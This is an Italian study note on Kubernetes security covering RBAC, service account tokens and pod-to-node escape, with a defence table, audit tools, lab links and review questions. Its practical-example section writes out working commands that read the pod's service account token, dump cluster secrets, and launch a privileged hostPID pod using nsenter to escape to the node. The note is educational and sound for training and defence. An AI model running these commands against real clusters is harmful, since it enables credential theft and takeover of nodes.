---
tipo: concetto
tag: [cloud, linux, tool]
fase: 4
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["Kubernetes Security (RBAC, escape)"]
---

# Kubernetes Security (RBAC, escape)

## In breve
**Kubernetes** orchestra container su un cluster (control plane + worker node che eseguono pod) e offre una superficie d'attacco ampia: API server esposto, **RBAC** mal configurato, **service account token** montati nei pod, secrets in chiaro in etcd. La catena tipica è: token SA con verbi pericolosi (`create pods`, `pods/exec`, `secrets`) → pod privilegiato che monta il filesystem del nodo → **pod → node escape** → control plane. La difesa cardine sono least privilege RBAC e Pod Security Admission.

## Definizione
**Kubernetes (K8s)** orchestra container su un cluster: un **control plane** (API server, etcd,
scheduler, controller) e dei **worker node** che eseguono **pod**. La superficie d'attacco è ampia:
**API server** esposto, **RBAC** mal configurato, **service account token** montati nei pod,
**secrets** in chiaro in etcd, e il rischio di **pod → node escape** che estende
[[Container Security (Docker)|l'escape dei container]] al nodo e poi al cluster.

## Meccanismo: RBAC e service account
- **RBAC**: `Role`/`ClusterRole` (insiemi di permessi) legati a soggetti tramite
  `RoleBinding`/`ClusterRoleBinding`. Verbi pericolosi: `create pods`, `*`, `secrets get/list`,
  `pods/exec`, `escalate`, `bind`, `impersonate`.
- **ServiceAccount token**: ogni pod monta di default un token in
  `/var/run/secrets/kubernetes.io/serviceaccount/`. Se il pod è compromesso, quel token parla con
  l'API server con i permessi del SA.
- **Privesc tipica**: SA con `create pods` → crei un pod privilegiato che monta il filesystem del
  nodo → escape sul nodo → eventualmente sul control plane.

## Esempio pratico — enumerazione e privesc
```bash
# Cosa posso fare? (autoanalisi RBAC)
kubectl auth can-i --list
kubectl auth can-i create pods

# Dal pod compromesso: uso il token del service account
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# Leggere i secrets (se il SA ha i permessi)
kubectl get secrets -o yaml

# Privesc: pod privilegiato che monta il root del NODO -> escape
kubectl run pwn --image=alpine --restart=Never --overrides='
{"spec":{"hostPID":true,"containers":[{"name":"p","image":"alpine",
"securityContext":{"privileged":true},"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/sh"],
"stdin":true,"tty":true}]}}' -it
```

## Attacco / Difesa
| Vettore d'attacco | Contromisura difensiva |
|---|---|
| RBAC con `*` / verbi pericolosi | Least privilege, niente `cluster-admin` ai SA delle app |
| Token SA abusato dal pod | `automountServiceAccountToken: false`; token con audience/scadenza |
| `create pods` → pod privilegiato | **Pod Security Admission** (livello *restricted*), policy OPA/Kyverno |
| API server esposto | Niente anonymous-auth, network policy, RBAC stretto |
| Secrets in chiaro in etcd | Encryption at rest di etcd, secret manager esterno |
| Pod → node escape | No `privileged`/`hostPID`/`hostPath`; seccomp; node isolation |

```bash
# Audit RBAC e cluster
kubectl get clusterrolebindings -o wide
# Tool consigliati
kube-hunter   # scoperta vulnerabilità
kube-bench    # CIS benchmark
```

## Lab
- **TryHackMe** — room *Kubernetes for Everyone*, *Intro to K8s*
- **KubeGoat** (deliberatamente vulnerabile) — https://github.com/madhuakula/kubernetes-goat
- **kube-hunter** — https://github.com/aquasecurity/kube-hunter / **kube-bench** — https://github.com/aquasecurity/kube-bench
- **HackTricks Cloud — Kubernetes** — https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html

> [!warning] Etica
> Esegui enumerazione RBAC, abuso di token SA e pod escape **solo** su cluster di tua proprietà o
> lab (KubeGoat, minikube). Compromettere cluster terzi è accesso abusivo a sistema informatico.

## Domande
**D: Cos'è RBAC in Kubernetes e dove sbaglia?**
R: Role/ClusterRole + RoleBinding decidono chi può fare cosa sulle API. Permessi eccessivi (es.
`create pods`, `pods/exec`, `secrets get`, impersonate) diventano primitive di privesc nel cluster.

**D: Come si esce da un pod verso il nodo/host?**
R: Pod **privileged**, **hostPath** che monta il filesystem del nodo, **hostPID/hostNetwork**, o un
service account token con RBAC ampio. Creare un pod con hostPath `/` = lettura/scrittura sul nodo.

**D: Dove sta il service account token e perché conta?**
R: Montato di default in `/var/run/secrets/kubernetes.io/serviceaccount/token`. Se il SA ha permessi
RBAC larghi, chi compromette il pod li eredita → enumerare con `kubectl auth can-i --list`.

## Collegamenti
- [[Container Security (Docker)]]
- [[Privilege Escalation in Cloud]]
- [[Privilege Escalation Linux]]
- [[IAM Cloud (utenti, ruoli, policy)]]
- [[Logging e Detection Cloud (CloudTrail)]]

## Fonti
- Kubernetes — RBAC Authorization: https://kubernetes.io/docs/reference/access-authn-authz/rbac/
- Kubernetes — Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- HackTricks Cloud — Kubernetes Security: https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/index.html
